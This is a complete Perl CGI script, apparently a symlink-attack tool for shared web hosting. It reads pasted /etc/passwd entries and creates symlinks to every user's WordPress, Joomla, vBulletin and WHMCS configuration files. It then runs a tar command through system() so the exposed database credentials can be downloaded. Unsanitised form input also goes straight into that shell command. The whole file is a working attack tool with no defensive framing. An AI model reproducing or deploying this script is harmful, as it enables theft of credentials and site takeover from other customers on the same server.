#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title> :( </title>
<style type="text/css">
.newStyle1 {
 font-family: Tahoma;
 font-size: x-large;
 color: #000000;
 background-color: #C0C0C0;
 text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$kola=$msr."/".$user;
$kola=~s/\n//g;
symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'.txt');
symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'1.txt');
symlink('/home/'.$user.'/public_html/config.php',$kola.'2.txt');
symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'3.txt');
symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'5.txt');
symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'4.txt');
symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'13.txt');
symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'14.txt');
symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'6.txt');
symlink('/home/'.$user.'/public_html/include/db.php',$kola.'7.txt');
symlink('/home/'.$user.'/public_html/connect.php',$kola.'8.txt');
symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'9.txt');
symlink('/home/'.$user.'/public_html/configuration.php',$kola.'10.txt');
symlink('/home/'.$user.'/public_html/include/config.php',$kola.'12.txt');
symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'11.txt');
symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'15.txt');
symlink('/home/'.$user.'/public_html/whmc/configuration.php',$kola.'16.txt');
symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'17.txt');
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1">
<p>Priv8 KING OF SADNESS</p>
<p> :/ </p>
<form method="post">
<textarea name="pass" style="width: 543px; height: 420px"></textarea>
<br />
<input name="tar" type="text" style="width: 212px" /><br />
<input name="Submit1" type="submit" value="submit" style="width: 99px" /><br />
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1">
<p>Done !!</p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar">Click here 2 download tar file</a></p>';
}
}
 print"
</body>
</html>";